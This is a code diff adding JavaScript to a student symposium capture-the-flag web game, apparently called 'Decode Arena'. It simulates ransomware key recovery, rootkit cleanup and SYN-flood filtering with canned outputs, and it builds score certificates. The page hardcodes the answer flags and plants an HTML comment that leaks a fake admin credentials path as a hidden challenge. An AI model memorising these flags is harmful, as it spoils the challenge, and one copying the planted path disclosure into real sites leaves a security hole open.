+        let ransomTimerSeconds = 299;
+        let ransomInterval = null;
+
+        function startScadaTimer() {
+            if (ransomInterval) return;
+            ransomInterval = setInterval(() => {
+                if (ransomTimerSeconds > 0) {
+                    ransomTimerSeconds--;
+                    const m = Math.floor(ransomTimerSeconds / 60).toString().padStart(2, '0');
+                    const s = (ransomTimerSeconds % 60).toString().padStart(2, '0');
+                    const cd = document.getElementById('ransomCountdown');
+                    if (cd) cd.textContent = `${m}:${s}`;
+                } else {
+                    clearInterval(ransomInterval);
+                }
+            }, 1000);
+        }
+
+        function dumpScadaHeap() {
+            startScadaTimer();
+            const out = document.getElementById('ransomOutput');
+            if (!out) return;
+
+            out.textContent = `[Volatility Memory Dumper] Extracting PID 4192 Heap (CryptLocker_SCADA.exe)...\n` +
+                `0x0084A000: 53 43 41 44 41 5F 4C 4F 43 4B 45 44 00 00 00 00  SCADA_LOCKED....\n` +
+                `0x0084A010: 41 45 53 2D 32 35 36 2D 43 42 43 00 00 00 00 00  AES-256-CBC.....\n` +
+                `0x0084A020: 4B 33 79 5F 34 33 39 38 5F 41 45 53 5F 4D 33 4D  K3y_4398_AES_M3M\n` +
+                `0x0084A030: 5F 44 55 4D 50 21 00 00 49 56 5F 39 30 39 31 5F  _DUMP!..IV_9091_\n` +
+                `0x0084A040: 56 45 43 54 4F 52 00 00 74 61 72 67 65 74 2E 64  VECTOR..target.d\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `[+] Cryptographic Keys Recovered from Unallocated Heap:\n` +
+                `    AES KEY: K3y_4398_AES_M3M_DUMP!\n` +
+                `    AES IV : IV_9091_VECTOR\n` +
+                `[+] Click "Inject AES Key & Defuse" to decrypt the SCADA nodes!`;
+        }
+
+        function revertScadaPayload() {
+            if (ransomInterval) {
+                clearInterval(ransomInterval);
+                ransomInterval = null;
+            }
+            const cd = document.getElementById('ransomCountdown');
+            if (cd) {
+                cd.textContent = 'DEFUSED';
+                cd.style.color = 'var(--green)';
+            }
+
+            const out = document.getElementById('ransomOutput');
+            if (!out) return;
+            out.textContent = `[SCADA Emergency Console] Injecting Recovered AES-256 Key & IV...\n` +
+                `[+] Initializing Decryption Stream on Industrial Valve Controller #4...\n` +
+                `[+] Integrity Check: SHA-256 matched original firmware hash.\n` +
+                `[+] Reactor Temperature: 22.4°C (Normal Nominal Status)\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `RANSOMWARE DEFUSED! INDUSTRIAL INFRASTRUCTURE RESTORED.\n` +
+                `DEFUSAL FLAG: DECODE{r4ns0mw4r3_m3m0ry_f0r3ns1cs_d3crypt3d}\n` +
+                `--------------------------------------------------------------------------------`;
+            round2ActionDone['op_ransom'] = true;
+        }
+
+        // 8. Malware Disassembly & Rootkit Neutralizer
+        function scanAutoruns() {
+            const out = document.getElementById('malwareOutput');
+            if (!out) return;
+            out.textContent = `[Sysinternals Autoruns Scan Result]\n` +
+                `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n` +
+                `  + RealtekAudioHD  -> "C:\\Program Files\\Realtek\\RtkNGUI.exe" (Signed: Realtek Inc)\n` +
+                `  + WindowsDefender -> "C:\\Program Files\\Windows Defender\\MSASCui.exe" (Signed: Microsoft)\n` +
+                `  + WinAudioUpdate  -> "C:\\Windows\\System32\\drivers\\svchost_rootkit.sys" (UNSIGNED! 🚨)\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `[!] Rootkit Hook: svchost_rootkit.sys hooks NtQuerySystemInformation to hide its PID.\n` +
+                `[+] Click "Unhook svchost_rootkit.sys" to unbind the kernel driver.`;
+        }
+
+        function unhookDriver() {
+            const out = document.getElementById('malwareOutput');
+            if (!out) return;
+            out.textContent = `[Kernel Memory Patch]\n` +
+                `[+] Restoring SSDT (System Service Descriptor Table) original offsets...\n` +
+                `[+] NtQuerySystemInformation: Hook removed -> Reverted to ntoskrnl.exe!\n` +
+                `[+] Hidden process PID 9044 unmasked in Task Manager.\n` +
+                `[+] Click "Delete Persistence Key" to complete the decontamination.`;
+        }
+
+        function purgeMalwareRegistry() {
+            const out = document.getElementById('malwareOutput');
+            if (!out) return;
+            out.textContent = `[Registry Sanitization Engine]\n` +
+                `[+] Executing: reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinAudioUpdate" /f\n` +
+                `[+] Successfully deleted autostart persistence entry.\n` +
+                `[+] Shredded file: C:\\Windows\\System32\\drivers\\svchost_rootkit.sys (DoD 5220.22-M 7-pass)\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `SYSTEM DECONTAMINATED! ROOTKIT EXTERMINATED.\n` +
+                `CLEANUP FLAG: DECODE{malware_persistence_rootkit_neutralized}\n` +
+                `--------------------------------------------------------------------------------`;
+            round2ActionDone['op_malware'] = true;
+        }
+
+        // 9. Volumetric DDoS Scrubbing
+        function inspectDdosFlow() {
+            const out = document.getElementById('ddosOutput');
+            if (!out) return;
+            out.textContent = `[NetFlow Collector v9 - Ingress Summary on eth0]\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `TOTAL INBOUND BANDWIDTH: 452.8 Gbps (Link Capacity: 500 Gbps - 90.5% SATURATED)\n` +
+                `PACKET RATE: 38,400,000 pps\n` +
+                `TOP TALKERS BY SOURCE SUBNET:\n` +
+                `  1. 198.51.100.0/24  -> 445.2 Gbps (98.4%) | TCP SYN Flags | Target: 203.0.113.10:443\n` +
+                `  2. 192.0.2.0/24     ->   3.4 Gbps (0.8%)  | HTTPS Data    | Legitimate Traffic\n` +
+                `  3. Others (Global)  ->   4.2 Gbps (0.8%)  | DNS / NTP     | Legitimate Traffic\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `[!] TELEMETRY ALERT: 98.4% of total ingress is saturated by the top talker subnet!\n` +
+                `[+] Inspect the top talkers table above, set the mitigation Action & Protocol, enter the source CIDR block, and deploy the ACL rule.`;
+        }
+
+        function deployDdosFilter() {
+            const action = document.getElementById('ddosRuleAction')?.value || '';
+            const proto = document.getElementById('ddosRuleProto')?.value || '';
+            const cidr = (document.getElementById('ddosRuleCidr')?.value || '').trim();
+            const out = document.getElementById('ddosOutput');
+            if (!out) return;
+
+            const isCidrMatch = (cidr === '198.51.100.0/24' || cidr === '198.51.100.0');
+
+            if (action === 'DROP' && proto === 'TCP_SYN' && isCidrMatch) {
+                round2ActionDone['op_ddos'] = true;
+                out.textContent = "[BGP Edge Router BCM56870] Deploying Hardware ACL Policy...\n" +
+                    "[+] Applying: iptables -I PREROUTING -s 198.51.100.0/24 -p tcp --syn -j DROP\n" +
+                    "[+] Committing rule to TCAM ASIC hardware table...\n" +
+                    "[+] Inbound traffic dropped instantly from 452.8 Gbps to 7.6 Gbps!\n" +
+                    "[+] Server latency normalized: 14ms (Packet Loss: 0.00%)\n" +
+                    "--------------------------------------------------------------------------------\n" +
+                    "DDoS ATTACK MITIGATED! INFRASTRUCTURE DEFENSE SUCCESSFUL.\n" +
+                    "DEFENSE FLAG: DECODE{ddos_syn_flood_scrubbed_offline_prevented}\n" +
+                    "--------------------------------------------------------------------------------";
+            } else {
+                out.textContent = "[-] Policy Verification Failed!\n" +
+                    `Current Selection: ACTION=${action || 'None'}, PROTO=${proto || 'None'}, CIDR=${cidr || 'None'}\n` +
+                    "[-] Hint: Set Action to DROP, Protocol to TCP SYN Flag, and enter the offending source CIDR subnet from the NetFlow telemetry summary above.\n" +
+                    "Select the options above and click Deploy Scrubbing Rule!";
+            }
+        }
+
+        function setScorecardStage(stage) {
+            currentScorecardStage = stage; // 'r1', 'r2', 'grand'
+
+            const tabR1 = document.getElementById('stageTabR1');
+            const tabR2 = document.getElementById('stageTabR2');
+            const tabGrand = document.getElementById('stageTabGrand');
+
+            if (tabR1) tabR1.classList.toggle('active', stage === 'r1');
+            if (tabR2) tabR2.classList.toggle('active', stage === 'r2');
+            if (tabGrand) tabGrand.classList.toggle('active', stage === 'grand');
+
+            const totalScoreEl = document.getElementById('sheetTotalScore');
+            const solvedCountEl = document.getElementById('sheetSolvedCount');
+            const tierBadgeEl = document.getElementById('sheetTierBadge');
+            const subtitleEl = document.querySelector('.sheet-subtitle');
+
+            const r1Solved = getSolvedCount();
+            const r2Solved = Object.keys(round2SolvedOps).filter(k => round2SolvedOps[k] && round2SolvedOps[k].solved).length;
+            const grandScore = totalScore + round2Score;
+
+            if (stage === 'r1') {
+                if (totalScoreEl) totalScoreEl.innerHTML = `${totalScore.toLocaleString()} <small>PTS</small>`;
+                if (solvedCountEl) solvedCountEl.textContent = `${r1Solved} / 24`;
+                if (tierBadgeEl) tierBadgeEl.textContent = getSecurityTier(totalScore).title;
+                if (subtitleEl) subtitleEl.textContent = '// Stage 1: Recon & Operational Cyber Assessment';
+            } else if (stage === 'r2') {
+                if (totalScoreEl) totalScoreEl.innerHTML = `${round2Score.toLocaleString()} <small>PTS</small>`;
+                if (solvedCountEl) solvedCountEl.textContent = `${r2Solved} / 9`;
+                if (tierBadgeEl) tierBadgeEl.textContent = getRound2Tier(round2Score);
+                if (subtitleEl) subtitleEl.textContent = '// Stage 2: Apex Cyber Warfare Assessment';
+            } else {
+                if (totalScoreEl) totalScoreEl.innerHTML = `${grandScore.toLocaleString()} <small>PTS</small>`;
+                if (solvedCountEl) solvedCountEl.textContent = `${r1Solved + r2Solved} / 33`;
+                if (tierBadgeEl) tierBadgeEl.textContent = getGrandChampionshipTier(grandScore);
+                if (subtitleEl) subtitleEl.textContent = '// Grand Championship: Combined Cyber Operations';
+            }
+
+            // Also re-render breakdown
+            updateScorecardDisplay();
+        }
+
+        function getRound2Tier(score) {
+            if (score >= 2400) return '👑 APEX WARLORD';
+            if (score >= 1800) return '⚔️ CYBER COMMANDER';
+            if (score >= 1000) return '🛡️ TACTICAL OPERATOR';
+            return '🔰 WARFARE INITIATE';
+        }
+
+        function getGrandChampionshipTier(score) {
+            if (score >= 4000) return '🏆 SUPREME CYBER GRANDMASTER';
+            if (score >= 3200) return '👑 ELITE SYMPOSIUM CHAMPION';
+            if (score >= 2000) return '⚔️ SENIOR DEFENSE SPECIALIST';
+            return '🔰 CYBER APPRENTICE';
+        }
+
+        // Enhanced Canvas Generator for PNG/JPG Certificate Generation
+        function generateScoreSheetCanvas() {
+            saveParticipantInfo();
+            const isTeam = (currentScorecardMode === 'team');
+            const stage = currentScorecardStage || 'r1';
+
+            const r1Solved = getSolvedCount();
+            const r2Solved = Object.keys(round2SolvedOps).filter(k => round2SolvedOps[k] && round2SolvedOps[k].solved).length;
+            const grandScore = totalScore + round2Score;
+
+            let displayedScore = totalScore;
+            let displayedSolved = `${r1Solved} / 24`;
+            let stageTitle = 'STAGE 1: CYBER RECON ASSESSMENT';
+            let tierTitle = getSecurityTier(totalScore).title;
+
+            if (stage === 'r2') {
+                displayedScore = (typeof round2Score === 'number' ? round2Score : 0);
+                displayedSolved = `${r2Solved} / 9`;
+                stageTitle = 'STAGE 2: APEX CYBER WARFARE';
+                tierTitle = (typeof getRound2Tier === 'function') ? getRound2Tier(displayedScore) : '⚔️ CYBER COMMANDER';
+            } else if (stage === 'grand') {
+                displayedScore = grandScore;
+                displayedSolved = `${r1Solved + r2Solved} / 33`;
+                stageTitle = 'GRAND CHAMPIONSHIP (STAGE 1 + 2)';
+                tierTitle = (typeof getGrandChampionshipTier === 'function') ? getGrandChampionshipTier(displayedScore) : '👑 ELITE SYMPOSIUM CHAMPION';
+            }
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 1200;
+            canvas.height = isTeam ? 860 : 800;
+            const ctx = canvas.getContext('2d');
+
+            // 1. Dark Cyber Background
+            const bgGrad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+            bgGrad.addColorStop(0, '#060810');
+            bgGrad.addColorStop(0.5, '#0b1122');
+            bgGrad.addColorStop(1, '#05070e');
+            ctx.fillStyle = bgGrad;
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            // 2. Cyber Matrix Grid lines
+            ctx.strokeStyle = 'rgba(0, 240, 255, 0.05)';
+            ctx.lineWidth = 1;
+            for (let x = 30; x < canvas.width; x += 40) {
+                ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
+            }
+            for (let y = 30; y < canvas.height; y += 40) {
+                ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
+            }
+
+            // 3. Double Outer Border
+            ctx.strokeStyle = (stage === 'r2' || stage === 'grand') ? 'rgba(255, 0, 85, 0.6)' : 'rgba(0, 240, 255, 0.6)';
+            ctx.lineWidth = 3;
+            ctx.strokeRect(20, 20, canvas.width - 40, canvas.height - 40);
+
+            ctx.strokeStyle = 'rgba(255, 215, 0, 0.3)';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(26, 26, canvas.width - 52, canvas.height - 52);
+
+            // 4. Header Zone
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 34px "Orbitron", sans-serif';
+            ctx.fillText('DECODE ARENA', 50, 75);
+
+            ctx.fillStyle = (stage === 'r2' || stage === 'grand') ? '#ff0055' : '#00f0ff';
+            ctx.font = '16px "Share Tech Mono", monospace';
+            ctx.fillText('CYBERSECURITY SYMPOSIUM 2026 // OFFICIAL CERTIFICATE', 50, 105);
+
+            // Tier Badge Box
+            ctx.fillStyle = 'rgba(255, 215, 0, 0.12)';
+            ctx.strokeStyle = '#ffd700';
+            ctx.lineWidth = 1.5;
+            ctx.strokeRect(canvas.width - 340, 48, 290, 56);
+            ctx.fillRect(canvas.width - 340, 48, 290, 56);
+
+            ctx.fillStyle = '#ffd700';
+            ctx.font = 'bold 18px "Orbitron", sans-serif';
+            ctx.textAlign = 'center';
+            ctx.fillText(tierTitle, canvas.width - 195, 84);
+            ctx.textAlign = 'left';
+
+            // Divider line
+            ctx.strokeStyle = 'rgba(255, 255, 255, 0.15)';
+            ctx.beginPath();
+            ctx.moveTo(50, 130);
+            ctx.lineTo(canvas.width - 50, 130);
+            ctx.stroke();
+
+            // 5. Title & Stage
+            ctx.fillStyle = '#e8e8f0';
+            ctx.font = 'bold 24px "Orbitron", sans-serif';
+            ctx.fillText('OFFICIAL PARTICIPANT VERIFICATION RECORD', 50, 175);
+
+            ctx.fillStyle = (stage === 'r2' || stage === 'grand') ? '#ff5500' : '#00f0ff';
+            ctx.font = 'bold 16px "Share Tech Mono", monospace';
+            ctx.fillText(`[ ${stageTitle} ]`, 50, 205);
+
+            // 6. Participant Data Zone
+            let curY = 250;
+            ctx.fillStyle = 'rgba(14, 20, 36, 0.9)';
+            ctx.fillRect(50, curY, canvas.width - 100, isTeam ? 190 : 130);
+            ctx.strokeStyle = 'rgba(0, 240, 255, 0.2)';
+            ctx.strokeRect(50, curY, canvas.width - 100, isTeam ? 190 : 130);
+
+            if (isTeam) {
+                const team = document.getElementById('sheetTeamName')?.value.trim() || 'Team Cyber Phantoms';
+                const col = document.getElementById('sheetTeamCollege')?.value.trim() || 'Engineering Symposium';
+                const m1 = document.getElementById('sheetMember1')?.value.trim() || 'Lead Member';
+                const m2 = document.getElementById('sheetMember2')?.value.trim() || 'Member 2';
+                const m3 = document.getElementById('sheetMember3')?.value.trim() || 'Member 3';
+
+                ctx.fillStyle = '#00f0ff';
+                ctx.font = 'bold 13px "Share Tech Mono", monospace';
+                ctx.fillText('TEAM NAME', 75, curY + 32);
+                ctx.fillStyle = '#ffffff';
+                ctx.font = 'bold 20px "Rajdhani", sans-serif';
+                ctx.fillText(team, 75, curY + 58);
+
+                ctx.fillStyle = '#00f0ff';
+                ctx.font = 'bold 13px "Share Tech Mono", monospace';
+                ctx.fillText('INSTITUTION / COLLEGE', 560, curY + 32);
+                ctx.fillStyle = '#ffffff';
+                ctx.font = 'bold 18px "Rajdhani", sans-serif';
+                ctx.fillText(col, 560, curY + 58);
+
+                ctx.fillStyle = '#ffd700';
+                ctx.font = 'bold 13px "Share Tech Mono", monospace';
+                ctx.fillText('TEAM MEMBERS (3 VERIFIED PARTICIPANTS)', 75, curY + 98);
+                ctx.fillStyle = '#e8e8f0';
+                ctx.font = '16px "Rajdhani", sans-serif';
+                ctx.fillText(`1. ${m1} (Lead)    |    2. ${m2}    |    3. ${m3}`, 75, curY + 124);
+
+                curY += 215;
+            } else {
+                const name = document.getElementById('sheetParticipantName')?.value.trim() || 'Solo Cyber Agent';
+                const col = document.getElementById('sheetCollegeName')?.value.trim() || 'Engineering Symposium';
+
+                ctx.fillStyle = '#00f0ff';
+                ctx.font = 'bold 13px "Share Tech Mono", monospace';
+                ctx.fillText('PARTICIPANT NAME', 75, curY + 35);
+                ctx.fillStyle = '#ffffff';
+                ctx.font = 'bold 22px "Rajdhani", sans-serif';
+                ctx.fillText(name, 75, curY + 65);
+
+                ctx.fillStyle = '#00f0ff';
+                ctx.font = 'bold 13px "Share Tech Mono", monospace';
+                ctx.fillText('INSTITUTION / COLLEGE', 560, curY + 35);
+                ctx.fillStyle = '#ffffff';
+                ctx.font = 'bold 20px "Rajdhani", sans-serif';
+                ctx.fillText(col, 560, curY + 65);
+
+                curY += 155;
+            }
+
+            // 7. Metrics Highlight Row (Total Score & Challenges Solved)
+            const boxW = (canvas.width - 130) / 3;
+            const bY = curY;
+            const bH = 100;
+
+            // Metric 1: Score
+            ctx.fillStyle = 'rgba(255, 0, 85, 0.12)';
+            ctx.fillRect(50, bY, boxW, bH);
+            ctx.strokeStyle = 'rgba(255, 0, 85, 0.4)';
+            ctx.strokeRect(50, bY, boxW, bH);
+
+            ctx.fillStyle = '#ff0055';
+            ctx.font = 'bold 13px "Share Tech Mono", monospace';
+            ctx.fillText('OFFICIAL SCORE', 70, bY + 30);
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 38px "Orbitron", sans-serif';
+            ctx.fillText(displayedScore.toLocaleString(), 70, bY + 75);
+
+            // Metric 2: Solved
+            ctx.fillStyle = 'rgba(0, 240, 255, 0.1)';
+            ctx.fillRect(50 + boxW + 15, bY, boxW, bH);
+            ctx.strokeStyle = 'rgba(0, 240, 255, 0.4)';
+            ctx.strokeRect(50 + boxW + 15, bY, boxW, bH);
+
+            ctx.fillStyle = '#00f0ff';
+            ctx.font = 'bold 13px "Share Tech Mono", monospace';
+            ctx.fillText('CHALLENGES SOLVED', 70 + boxW + 15, bY + 30);
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 36px "Orbitron", sans-serif';
+            ctx.fillText(displayedSolved, 70 + boxW + 15, bY + 75);
+
+            // Metric 3: Security Clearance Tier
+            ctx.fillStyle = 'rgba(57, 255, 20, 0.1)';
+            ctx.fillRect(50 + (boxW + 15) * 2, bY, boxW, bH);
+            ctx.strokeStyle = 'rgba(57, 255, 20, 0.4)';
+            ctx.strokeRect(50 + (boxW + 15) * 2, bY, boxW, bH);
+
+            ctx.fillStyle = '#39ff14';
+            ctx.font = 'bold 13px "Share Tech Mono", monospace';
+            ctx.fillText('OFFICIAL CLEARANCE', 70 + (boxW + 15) * 2, bY + 30);
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 20px "Orbitron", sans-serif';
+            ctx.fillText(tierTitle, 70 + (boxW + 15) * 2, bY + 72);
+
+            // 8. Bottom Certificate Footer
+            const footY = canvas.height - 70;
+            ctx.strokeStyle = 'rgba(255, 255, 255, 0.15)';
+            ctx.beginPath();
+            ctx.moveTo(50, footY - 15);
+            ctx.lineTo(canvas.width - 50, footY - 15);
+            ctx.stroke();
+
+            const dateStr = new Date().toISOString().split('T')[0];
+            ctx.fillStyle = '#a0a5c0';
+            ctx.font = '14px "Share Tech Mono", monospace';
+            ctx.fillText(`ISSUED: ${dateStr} | SYMPOSIUM 2026 DECODE ARENA`, 50, footY + 15);
+
+            const recordId = 'VERIFIED-ID: DA-2026-' + Math.abs((totalScore * 31 + round2Score * 17) % 8999 + 1000);
+            ctx.textAlign = 'right';
+            ctx.fillStyle = '#ffd700';
+            ctx.fillText(recordId, canvas.width - 50, footY + 15);
+            ctx.textAlign = 'left';
+
+            return canvas;
+        }
+
+        // Submit Round 2 Record to Google Sheet
+        function submitRound2ToGoogleSheet() {
+            playVictorySound();
+            const r2Solved = Object.keys(round2SolvedOps).filter(k => round2SolvedOps[k] && round2SolvedOps[k].solved).length;
+            const grandTotal = totalScore + round2Score;
+
+            const fb = document.getElementById('finalsSubmitFeedback');
+            if (fb) {
+                fb.style.color = 'var(--cyan)';
+                fb.textContent = '⏳ Submitting Round 2 & Grand Championship records to Google Sheet...';
+            }
+
+            storeSubmissionToDatabase({
+                action: 'Round 2 Finals Submitted',
+                roundName: 'Round 2 - Apex Cyber Warfare',
+                requireFields: true,
+                resetAfter: false,
+                feedbackTarget: 'submit'
+            }).then(() => {
+                if (fb) {
+                    fb.style.color = 'var(--green)';
+                    fb.innerHTML = `✅ Successfully submitted Round 2 Warfare (${round2Score} PTS) &amp; Grand Total (${grandTotal} PTS) to Google Sheets!`;
+                }
+            }).catch(err => {
+                if (fb) {
+                    fb.style.color = '#ffaa00';
+                    fb.textContent = `ℹ️ Score enqueued locally for sync: ${err.message || 'Offline queue active'}`;
+                }
+            });
+        }
+
+        // On window load: Initialize Round 2 state
+        window.addEventListener('DOMContentLoaded', () => {
+            initRound2State();
+        });
+
+</script>
+
+    <!-- ============================================================ -->
+    <!-- 🕵️ OUTSIDE BUG 08: ROBOTS / ADMIN PATH DISCLOSURE LEAK       -->
+    <!-- Disallow: /admin/backup_credentials.txt                     -->
+    <!-- Leaked Secret Flag: DECODE{robots_txt_reveals_paths}        -->
+    <!-- ============================================================ -->
+
 </body>
 </html>
